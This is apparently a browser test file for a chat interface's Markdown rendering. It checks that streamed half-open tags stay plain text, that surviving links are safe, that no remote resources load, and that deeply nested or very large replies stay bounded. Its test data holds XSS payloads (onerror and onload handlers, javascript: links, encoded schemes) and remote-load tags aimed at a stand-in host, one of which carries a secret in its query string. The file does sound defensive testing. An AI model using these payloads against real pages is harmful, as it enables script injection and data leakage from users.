// Streaming, links, remote resources, nesting and size of the chat's Markdown on both engines. A half-open tag is shown as
// text at every character of a stream, a link that survives is inert or safe to press, nothing remote loads, and a deep, wide
// or huge reply leaves a bounded tree and a page that still answers.
import assert from "node:assert/strict";
import { PROFILE, boot, calls, openAi, sendText } from "./ai-lib.mjs";
import {
  PAGE_ADDED, armGuards, chars, domProblems, dropRawReports, loadCorpus, pageClean, readWatch, responsive, watchDom,
} from "./aigate-lib.mjs";

export default async function ({ page, url, errors }) {
  page.setDefaultTimeout(10000);
  const corpus = loadCorpus();
  await boot(page, url, { profiles: [PROFILE] });
  const guards = armGuards(page, url);
  await openAi(page);
  await splitCase(page, guards);
  await linkCase(page, url, guards, corpus);
  await remoteCase(page, guards);
  await nestCase(page, guards);
  await hugeCase(page, guards);
  await dropRawReports(page, errors);
  assert.deepEqual(errors, [], "the page reported errors");
}

/** The reply the page drew last, as the node of its text. */
const LAST = '.chat-msg[data-role="assistant"]:last-of-type .chat-text';

/** Wait until the chat shows `n` messages of the assistant and no reply is streaming. */
const finished = (page, n) =>
  page.waitForFunction(
    (count) =>
      document.querySelectorAll('.chat-msg[data-role="assistant"][data-status="complete"]').length === count && !document.querySelector(".chat-partial"),
    n,
  );

/** How many replies of the assistant the page has drawn so far. */
const replies = (page) => page.locator('.chat-msg[data-role="assistant"][data-status="complete"]').count();

/** Script the core's Markdown renderer to answer `html` for every text, then run one turn whose reply is `text` and wait for it to draw. */
async function reply(page, text, html, { chunks = [text] } = {}) {
  const before = await replies(page);
  await page.evaluate(
    ([parts, answer]) => {
      window.__MOCK__.ai.script({ chunks: parts });
      window.__MOCK__.on("markdown_render", () => answer);
    },
    [chunks, html],
  );
  await sendText(page, "go");
  await finished(page, before + 1);
}

/** What a stream cut anywhere looks like: each string is delivered one character at a time. */
const HALF_OPEN = [
  ["image with a handler, cut before its closing bracket, and the start of a script", "<img src=x onerror=window.__XSS=1 <scr"],
  ["a script element in two halves", "<scr" + "ipt>window.__XSS = 1</scr" + "ipt>"],
  ["a link with the start of a script address and a canary", "[click](javascript:zq-canary-91ac"],
  ["an image whose address would carry data", "![x](https://evil.example/p.png?d=1"],
  ["an svg tag with a load handler and no closing bracket", "<svg onload=window.__XSS=1"],
  ["an unclosed fence with a script inside", "```html\n<script>window.__XSS = 1</script>"],
  ["a half-written character reference of the scheme", '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;window.__XSS=1">x</a>&#'],
];

/**
 * Each half-open string is streamed one character at a time. While it streams the reply is text in the partial message and
 * never gets a child element; a mutation observer checks the log after every change. When the turn ends the message says
 * exactly the string.
 */
async function splitCase(page, guards) {
  await watchDom(page, ".chat-log", { checkIn: ".chat-text", textOnlyBelow: ".chat-partial .chat-text" });
  let done = 0;
  for (const [what, text] of HALF_OPEN) {
    const before = await replies(page);
    await page.evaluate(
      (parts) => {
        window.__MOCK__.ai.script({ chunks: parts });
        // The core's renderer: the text as one escaped paragraph, which is what a half-open tag becomes in the core.
        window.__MOCK__.on("markdown_render", ({ text: t }) => `<p>${t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")}</p>`);
      },
      chars(text),
    );
    await sendText(page, `split ${done}`);
    await finished(page, before + 1);
    await page.waitForFunction((n) => document.querySelectorAll(".chat-md").length > n, before);
    assert.equal(await page.locator(LAST).textContent(), text, `${what}: the final message says exactly the string`);
    assert.deepEqual(await readWatch(page), [], `${what}: the watch found a problem while it streamed`);
    assert.deepEqual(await domProblems(page, LAST, { extra: PAGE_ADDED }), [], `${what}: the final message has problems`);
    done += 1;
  }
  assert.equal(done, HALF_OPEN.length);
  // The watch can fail: an element that appears below a partial message is reported, so an empty watch above means something.
  await page.evaluate(() => {
    const holder = document.createElement("div");
    holder.className = "chat-partial";
    const text = document.createElement("div");
    text.className = "chat-text";
    holder.append(text);
    document.querySelector(".chat-log").append(holder);
    text.append(document.createElement("b"));
  });
  await page.waitForFunction(() => window.__WATCH.length > 0);
  const caught = await readWatch(page);
  assert.ok(caught.some((l) => l.startsWith("element-below-text")), `the watch missed an element below the partial message: ${caught}`);
  await page.evaluate(() => document.querySelector(".chat-partial")?.remove());
  await guards.assertQuiet("split");
  console.log(`aigate stream: ${done} strings streamed one character at a time`);
}

/** The HTML of every case that holds an anchor, as the core cleaned it and as the parser left it. */
const anchored = (corpus) => corpus.cases.flatMap((c) => [c.core_html, c.raw_html]).filter((h) => h !== null && /<a[\s>]/i.test(h));

/**
 * Every anchor that survives in a reply made of all the anchor-bearing cases is pressed once with a real click. The page does
 * not move, no window opens, and `open_url` is called only with an address that is absolute `http`, `https` or `mailto` with no
 * query string and no user name. An anchor without an address, or with one that fails the rule, is text.
 */
async function linkCase(page, url, guards, corpus) {
  const html = anchored(corpus).join("\n");
  await reply(page, "links", html);
  const links = page.locator(`${LAST} a`);
  const count = await links.count();
  assert.ok(count >= 3, `the reply has surviving links (${count})`);
  const here = page.url();
  const seen = [];
  let pressed = 0;
  for (let i = 0; i < count; i += 1) {
    const link = links.nth(i);
    const href = await link.getAttribute("href");
    assert.ok(href !== null && /^(https?:\/\/|mailto:)\S*$/i.test(href), `an anchor without a safe address survived: ${href}`);
    seen.push(href);
    const box = await link.boundingBox();
    if (box === null || box.width === 0 || box.height === 0) continue; // an empty link has no text to press
    const before = (await calls(page, "open_url")).length;
    await link.click();
    pressed += 1;
    assert.equal(page.url(), here, `the page's address changed after pressing ${href}`);
    assert.deepEqual(guards.popups(), [], `a window opened after pressing ${href}`);
    const made = (await calls(page, "open_url")).slice(before);
    for (const { url: opened } of made) {
      const u = new URL(opened);
      assert.ok(["http:", "https:", "mailto:"].includes(u.protocol), `open_url with ${opened}`);
      assert.equal(u.search, "", `open_url with a query string: ${opened}`);
      assert.equal(u.username, "", `open_url with a user name: ${opened}`);
    }
    assert.ok(made.length <= 1, "one press makes at most one call");
  }
  assert.ok(pressed >= 2, `links were pressed (${pressed} of ${count})`);
  assert.deepEqual(await domProblems(page, LAST, { extra: PAGE_ADDED }), [], "the links have problems");
  await guards.assertQuiet("links");
  console.log(`aigate links: ${count} anchors survived, ${pressed} pressed, ${[...new Set(seen)].length} distinct addresses`);
}

/** Every kind of reply that would load something from another origin, as the raw HTML a failed sanitiser would deliver. */
const REMOTE = [
  '<img src="https://evil.example/a.png?d=SECRET" alt="x">',
  '<picture><source srcset="https://evil.example/b.png 1x, https://evil.example/c.png 2x"><img src="https://evil.example/d.png"></picture>',
  '<video poster="https://evil.example/p.png" src="https://evil.example/v.mp4"></video>',
  '<audio src="https://evil.example/a.mp3"></audio>',
  '<link rel="stylesheet" href="https://evil.example/s.css">',
  '<svg><image href="https://evil.example/i.png"/></svg>',
  '<p style="background:url(https://evil.example/bg.png)">styled</p>',
  '<input type="image" src="https://evil.example/f.png">',
  '<object data="https://evil.example/o"></object><embed src="https://evil.example/e">',
  '<iframe src="https://evil.example/f"></iframe>',
];

/** Nothing remote is ever drawn: no image, no element with an address to load, no request to another origin, no report. */
async function remoteCase(page, guards) {
  const foreign = guards.foreign().length;
  await reply(page, "remote resources", `<p>start</p>${REMOTE.join("")}<p>end</p>`);
  const found = await page.evaluate(() => ({
    images: document.images.length,
    inLog: document.querySelectorAll(".chat-log img, .chat-log picture, .chat-log video, .chat-log audio, .chat-log svg, .chat-log iframe, .chat-log object, .chat-log embed, .chat-log link").length,
    loading: [...document.querySelectorAll(".chat-log *")].filter((n) => n.hasAttribute("src") || n.hasAttribute("srcset") || n.hasAttribute("poster") || n.hasAttribute("data")).map((n) => n.localName),
    styled: [...document.querySelectorAll(".chat-log *")].filter((n) => n.hasAttribute("style")).length,
  }));
  assert.equal(found.images, 0, "document.images is empty");
  assert.equal(found.inLog, 0, "no element that loads");
  assert.deepEqual(found.loading, [], "no element with an address to load");
  assert.equal(found.styled, 0, "no style attribute");
  assert.deepEqual(guards.foreign().slice(foreign), [], "no request went to another origin");
  assert.deepEqual(await domProblems(page, LAST, { extra: PAGE_ADDED }), [], "the remote reply has problems");
  await guards.assertQuiet("remote");
}

/** The deepest nesting and the number of elements below `selector`. */
const treeOf = (page, selector) =>
  page.evaluate((sel) => {
    const root = document.querySelector(sel);
    let deepest = 0;
    for (const n of root.querySelectorAll("*")) {
      let d = 0;
      for (let p = n; p !== null && p !== root; p = p.parentElement) d += 1;
      deepest = Math.max(deepest, d);
    }
    return { deepest, nodes: root.querySelectorAll("*").length };
  }, selector);

/** Deep, wide and nested replies leave a bounded tree and a page that answers. */
async function nestCase(page, guards) {
  for (const kind of ["200 nested divs", "100 nested tables", "300000 spans"]) {
    const before = await replies(page);
    // The documents are built in the page: a megabyte of markup is not sent through the protocol.
    await page.evaluate((what) => {
      const html =
        what === "200 nested divs"
          ? `${"<div>".repeat(200)}deep${"</div>".repeat(200)}`
          : what === "100 nested tables"
            ? `${"<table><tbody><tr><td>".repeat(100)}deep${"</td></tr></tbody></table>".repeat(100)}`
            : "<span>x</span>".repeat(300000);
      window.__MOCK__.ai.script({ chunks: ["nest"] });
      window.__MOCK__.on("markdown_render", () => html);
    }, kind);
    await sendText(page, "nest");
    await finished(page, before + 1);
    await page.waitForFunction((n) => document.querySelectorAll(".chat-md").length > n, before);
    const started = Date.now();
    await responsive(page, 5000);
    const tree = await treeOf(page, LAST);
    assert.ok(tree.deepest <= 66, `${kind}: the tree is ${tree.deepest} deep, the most is 66`);
    assert.ok(tree.nodes <= 200_100, `${kind}: the tree has ${tree.nodes} elements`);
    assert.ok(Date.now() - started < 8000, `${kind}: the page took too long to answer`);
    assert.deepEqual(await domProblems(page, LAST, { extra: PAGE_ADDED }), [], `${kind}: has problems`);
    console.log(`aigate nesting: ${kind}: depth ${tree.deepest}, ${tree.nodes} elements`);
  }
  await guards.assertQuiet("nesting");
}

/** A reply of 3 MiB and one of 1.5 MiB: plain text or bounded, never markup, and the page answers. */
async function hugeCase(page, guards) {
  const MIB = 1024 * 1024;
  for (const [what, size, refused] of [["3 MiB of text, refused by the core", 3 * MIB, true], ["1.5 MiB of Markdown source", 1.5 * MIB, false]]) {
    const before = await replies(page);
    await page.evaluate(
      ([bytes, refuse]) => {
        const text = "word ".repeat(Math.ceil(bytes / 5)).slice(0, bytes);
        window.__MOCK__.ai.script({ chunks: [text] });
        window.__MOCK__.on("markdown_render", ({ text: t }) =>
          refuse ? null : `<p>${t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")}</p>`);
      },
      [size, refused],
    );
    await sendText(page, "huge");
    await page.waitForFunction((n) => document.querySelectorAll('.chat-msg[data-role="assistant"]').length > n, before, { timeout: 15000 });
    await page.waitForTimeout(300);
    const started = Date.now();
    await responsive(page, 5000);
    const shown = await page.evaluate(() => {
      const nodes = [...document.querySelectorAll('.chat-msg[data-role="assistant"]:last-of-type .chat-text')];
      return nodes.map((n) => ({ elements: n.querySelectorAll("*").length, length: n.textContent.length }));
    });
    for (const one of shown) assert.ok(one.elements <= 5100, `${what}: ${one.elements} elements`);
    if (refused) for (const one of shown) assert.equal(one.elements, 0, `${what}: plain text, not markup`);
    assert.ok(Date.now() - started < 8000, `${what}: the page took too long to answer`);
    console.log(`aigate huge: ${what}: ${JSON.stringify(shown)}`);
  }
  assert.deepEqual(await pageClean(page), []);
  await guards.assertQuiet("huge");
}
